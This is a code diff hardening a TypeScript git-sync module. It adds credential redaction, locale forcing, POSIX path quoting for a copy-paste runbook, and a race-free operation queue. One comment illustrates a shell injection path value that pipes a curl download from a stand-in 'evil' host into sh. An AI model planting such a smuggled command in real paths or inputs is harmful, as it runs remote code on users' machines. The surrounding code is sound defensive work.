@@ -46,6 +46,73 @@ const execFileAsync = promisify(execFile);
 const DEFAULT_TIMEOUT_MS = 8_000;
 const MAX_BUFFER = 1024 * 1024;
 
+/**
+ * Force C locale + no TTY credential prompt for every git subprocess in
+ * this module.
+ *
+ * Round 2 audit fix (opus M3 + gpt #3 + deepseek M2): the previous code
+ * inherited the parent locale. Under `LANG=zh_CN.UTF-8` / `de_DE.UTF-8`,
+ * git emits translated error strings (e.g. "被拒绝" instead of "rejected"),
+ * so the classifyError regex (/rejected|non-fast-forward|fetch first/)
+ * silently missed real push rejections and labelled them `failed`. Users
+ * on non-English systems then saw a generic failure instead of the
+ * divergence runbook. Forcing LANG=C / LC_ALL=C gives stable error
+ * strings; the regex is now correct under all user locales.
+ *
+ * GIT_TERMINAL_PROMPT=0 (opus M3 bonus): if git's credential helper is
+ * missing or misconfigured, HTTPS push would otherwise prompt for a
+ * password and the subprocess would hang until our 8s timeout, costing
+ * the user a slow startup. Setting this var makes git fail-fast with
+ * "could not read Username for ..." which we then classify as `failed`.
+ */
+const GIT_ENV: NodeJS.ProcessEnv = {
+  ...process.env,
+  LANG: "C",
+  LC_ALL: "C",
+  GIT_TERMINAL_PROMPT: "0",
+};
+
+/**
+ * Redact userinfo from a URL so credentials don't leak into logs or UI.
+ *
+ * Round 2 audit fix (opus M1 + deepseek m2): `git remote get-url origin`
+ * returns the URL verbatim. If a user configured
+ * `https://alice:ghp_xxx@git.example.com/repo.git` (a common antipattern),
+ * the token would flow into `getStatus().remote`, `formatSyncStatus()`
+ * UI output, and any push stderr captured into the audit `error` field
+ * (e.g. `fatal: unable to access 'https://alice:ghp_xxx@...'`). The audit
+ * log is on disk forever. Invariant 4 ("No secrets in argv") was symmetric-
+ * asymmetric: argv-in was locked down but the output side leaked. This
+ * redactor closes that gap. SSH-style URLs (`git@host:path`) are not
+ * touched — they have no embedded secret.
+ */
+export function redactCredentials(s: string): string {
+  return s.replace(/(https?:\/\/)[^@\s\/]+@/gi, "$1***@");
+}
+
+/**
+ * POSIX shell-quote a filesystem path for safe paste-into-bash.
+ *
+ * Round 2 audit fix (opus M2): `/abrain sync` divergence runbook includes
+ * `cd <abrainHome>` that users will copy-paste into a shell. If
+ * `ABRAIN_ROOT` env had been injected with shell metacharacters by an
+ * earlier compromised process (e.g. `/tmp/evil"; curl evil.sh | sh; #`),
+ * the pasted line would execute arbitrary code at user paste time. We
+ * single-quote the path and escape any embedded single quotes via the
+ * POSIX-standard `'\''` trick so the result is always a single literal
+ * argument under sh / bash / zsh.
+ *
+ * If the path contains a newline or control char, we refuse the inline
+ * form (return a placeholder telling the user to cd manually) since those
+ * would corrupt the runbook even under quoting.
+ */
+export function shellQuotePath(p: string): string {
+  if (/[\x00-\x1f\x7f]/.test(p)) {
+    return "'<path contains control characters; cd to abrainHome manually>'";
+  }
+  return "'" + p.replace(/'/g, "'\\''") + "'";
+}
+
 export type GitSyncOp = "push" | "fetch" | "sync";
 
 /**
@@ -91,29 +158,39 @@ export interface GitSyncOptions {
 // simultaneously; without this lock the second push fails with "fatal:
 // Unable to create '.git/index.lock'" and we'd audit it as a spurious
 // failure even though the first push succeeded.
-let inflightOp: Promise<GitSyncEvent> | null = null;
+// Round 2 audit fix (gpt #2 TOCTOU): the previous implementation used a
+// single `inflightOp` slot with `if (inflightOp) await inflightOp`. With
+// 3+ concurrent callers, two/three of them all awaited the same prior
+// promise; when it resolved, all microtasks ran `fn()` near-simultaneously
+// because there was no chaining — each call only saw the *prior* inflight,
+// not its own siblings. That TOCTOU reintroduced exactly the index.lock
+// contention we wanted to prevent (smoke test #13 happened to pass only
+// because it tested 2 concurrent callers against a fast local-bare push;
+// 3+ on a slower network would have exposed the race).
+//
+// Fix: maintain `tail` as a chained promise. Each new caller links its `fn`
+// onto `tail.then(fn, fn)` so it runs strictly after every prior fn settles
+// (we pass fn as BOTH onFulfilled and onRejected so a prior rejection
+// doesn't block the next caller). `tail` is advanced to a swallowed copy
+// of the new promise so the chain stays alive without poisoning downstream.
+const _initialTailSentinel: Promise<unknown> = Promise.resolve();
+let tail: Promise<unknown> = _initialTailSentinel;
 
-async function singleFlight(
+function singleFlight(
   fn: () => Promise<GitSyncEvent>,
 ): Promise<GitSyncEvent> {
-  // Wait for any prior op to finish, but don't propagate its error —
-  // each op records its own outcome in audit.
-  if (inflightOp) {
-    await inflightOp.catch(() => undefined);
-  }
-  const p = fn();
-  inflightOp = p;
-  try {
-    return await p;
-  } finally {
-    // Only clear if no newer op has overwritten the slot in the meantime.
-    if (inflightOp === p) inflightOp = null;
-  }
+  const p = tail.then(fn, fn);
+  tail = p.then(
+    () => undefined,
+    () => undefined,
+  );
+  return p;
 }
 
-// Visible for tests. Lets smoke verify single-flight by inspecting the lock.
-export function _hasInflightOp(): boolean {
-  return inflightOp !== null;
+// Visible for tests. Returns `hasInflight: true` once at least one op has
+// flowed through the queue (tail has been replaced from the sentinel).
+export function _queueDepth(): { hasInflight: boolean } {
+  return { hasInflight: tail !== _initialTailSentinel };
 }
 
 // ── git helpers ─────────────────────────────────────────────────────
@@ -133,7 +210,7 @@ export async function hasGitRemote(abrainHome: string): Promise<boolean> {
     const { stdout } = await execFileAsync(
       "git",
       ["-C", abrainHome, "remote", "get-url", "origin"],
-      { timeout: 3_000, maxBuffer: 64 * 1024 },
+      { timeout: 3_000, maxBuffer: 64 * 1024, env: GIT_ENV },
     );
     return Boolean(stdout.trim());
   } catch {
@@ -154,7 +231,7 @@ export async function getAheadBehind(
     const { stdout } = await execFileAsync(
       "git",
       ["-C", abrainHome, "rev-list", "--left-right", "--count", "origin/main...HEAD"],
-      { timeout: 3_000, maxBuffer: 64 * 1024 },
+      { timeout: 3_000, maxBuffer: 64 * 1024, env: GIT_ENV },
     );
     const parts = stdout.trim().split(/\s+/);
     const behind = parseInt(parts[0] ?? "0", 10);
@@ -191,19 +268,34 @@ async function audit(abrainHome: string, event: GitSyncEvent): Promise<void> {
  * Classify an execFile error into a GitSyncResult code.
  * Used by both pushAsync and fetchAndFF so taxonomy stays consistent.
  */
-function classifyError(e: unknown): { result: GitSyncResult; message: string } {
+// Round 2 audit fixes:
+//   - opus M1 / deepseek m2: redact credential URLs from message BEFORE
+//     truncation. Push stderr can contain `https://user:tok@host/...`.
+//   - opus M3 / gpt #3 / deepseek M2: regex now relies on C locale (set
+//     via GIT_ENV on every execFile site), so we keep concise English
+//     phrases. Dropped bare `/behind/i` (too greedy).
+//   - opus m4: SIGINT (Ctrl-C from user) sets `killed && signal` too;
+//     classifying it as `timeout` was misleading. Real timeouts come
+//     with `signal === 'SIGTERM'`; SIGINT is user-initiated -> `failed`.
+//   - `allowPushRejected=false`: fetch-context callers avoid misleading
+//     `push_rejected` label when fetch stderr happens to match the regex.
+function classifyError(
+  e: unknown,
+  allowPushRejected: boolean = true,
+): { result: GitSyncResult; message: string } {
   const err = e as { killed?: boolean; signal?: string; message?: string; stderr?: string };
   const msg = String(err?.message || err || "unknown");
   const stderr = String(err?.stderr || "");
   const combined = msg + " " + stderr;
+  const message = redactCredentials(msg).slice(0, 500);
 
-  if (err?.killed && err?.signal) {
-    return { result: "timeout", message: msg.slice(0, 500) };
+  if (err?.killed && err?.signal === "SIGTERM") {
+    return { result: "timeout", message };
   }
-  if (/rejected|non-fast-forward|stale|fetch first|behind/i.test(combined)) {
-    return { result: "push_rejected", message: msg.slice(0, 500) };
+  if (allowPushRejected && /rejected|non-fast-forward|fetch first/i.test(combined)) {
+    return { result: "push_rejected", message };
   }
-  return { result: "failed", message: msg.slice(0, 500) };
+  return { result: "failed", message };
 }
 
 // ── public ops ──────────────────────────────────────────────────────
@@ -260,13 +352,15 @@ export async function pushAsync(opts: GitSyncOptions): Promise<GitSyncEvent> {
       await execFileAsync(
         "git",
         ["-C", opts.abrainHome, "push", "origin", "HEAD:main"],
-        { timeout: timeoutMs, maxBuffer: MAX_BUFFER },
+        { timeout: timeoutMs, maxBuffer: MAX_BUFFER, env: GIT_ENV },
       );
 
       event.result = "ok";
       event.durationMs = Date.now() - start;
     } catch (e: unknown) {
-      const { result, message } = classifyError(e);
+      // Push context: allow push_rejected classification (the regex was
+      // designed for git push rejection messages).
+      const { result, message } = classifyError(e, true);
       event.result = result;
       event.error = message;
       event.durationMs = Date.now() - start;
@@ -316,7 +410,7 @@ export async function fetchAndFF(opts: GitSyncOptions): Promise<GitSyncEvent> {
       await execFileAsync(
         "git",
         ["-C", opts.abrainHome, "fetch", "origin", "main"],
-        { timeout: timeoutMs, maxBuffer: MAX_BUFFER },
+        { timeout: timeoutMs, maxBuffer: MAX_BUFFER, env: GIT_ENV },
       );
 
       const { ahead, behind } = await getAheadBehind(opts.abrainHome);
@@ -331,7 +425,7 @@ export async function fetchAndFF(opts: GitSyncOptions): Promise<GitSyncEvent> {
         await execFileAsync(
           "git",
           ["-C", opts.abrainHome, "merge", "--ff-only", "origin/main"],
-          { timeout: timeoutMs, maxBuffer: MAX_BUFFER },
+          { timeout: timeoutMs, maxBuffer: MAX_BUFFER, env: GIT_ENV },
         );
         event.result = "ok";
       } else {
@@ -341,7 +435,10 @@ export async function fetchAndFF(opts: GitSyncOptions): Promise<GitSyncEvent> {
       }
       event.durationMs = Date.now() - start;
     } catch (e: unknown) {
-      const { result, message } = classifyError(e);
+      // Fetch context: don't allow push_rejected label (gpt #3 —
+      // fetch stderr containing 'rejected' should classify as failed,
+      // not as push semantics).
+      const { result, message } = classifyError(e, false);
       event.result = result;
       event.error = message;
       event.durationMs = Date.now() - start;
@@ -368,10 +465,19 @@ export async function sync(opts: GitSyncOptions): Promise<{
   const fetchEvent = await fetchAndFF(opts);
 
   if (fetchEvent.result === "diverged") {
+    // Round 2 audit fix (opus M2): the runbook contains `cd <path>` that
+    // users will copy/paste into a shell. If abrainHome contained shell
+    // metacharacters (via ABRAIN_ROOT env injection from an earlier
+    // compromised process), pasting would execute arbitrary code. Two
+    // defenses:
+    //   1. POSIX shell-quote the path so any quote/$/;/etc is literal.
+    //   2. If the path contains a newline or control char, refuse the
+    //      inline form and tell the user to cd manually.
+    const quotedHome = shellQuotePath(opts.abrainHome);
     const summary =
       `diverged: local has ${fetchEvent.ahead} commit(s), remote has ${fetchEvent.behind} commit(s) not in local.\n` +
       `ff-only merge refused. resolve manually:\n` +
-      `  cd ${opts.abrainHome}\n` +
+      `  cd ${quotedHome}\n` +
       `  git fetch origin && git status\n` +
       `  # then either: git merge origin/main   (creates merge commit)\n` +
       `  #         or: git rebase origin/main   (replays your commits on top)\n` +
@@ -432,9 +538,12 @@ export async function getStatus(abrainHome: string): Promise<AbrainSyncStatus> {
     const { stdout } = await execFileAsync(
       "git",
       ["-C", abrainHome, "remote", "get-url", "origin"],
-      { timeout: 3_000, maxBuffer: 64 * 1024 },
+      { timeout: 3_000, maxBuffer: 64 * 1024, env: GIT_ENV },
     );
-    status.remote = stdout.trim();
+    // Round 2 audit fix (opus M1 + deepseek m2): redact userinfo so a
+    // remote like https://alice:tok@host/repo never appears in /abrain
+    // status output or status.remote consumers.
+    status.remote = redactCredentials(stdout.trim());
   } catch {
     // no remote — leave undefined
   }
@@ -443,7 +552,7 @@ export async function getStatus(abrainHome: string): Promise<AbrainSyncStatus> {
     const { stdout } = await execFileAsync(
       "git",
       ["-C", abrainHome, "branch", "--show-current"],
-      { timeout: 3_000, maxBuffer: 64 * 1024 },
+      { timeout: 3_000, maxBuffer: 64 * 1024, env: GIT_ENV },
     );
     status.branch = stdout.trim() || undefined;
   } catch {
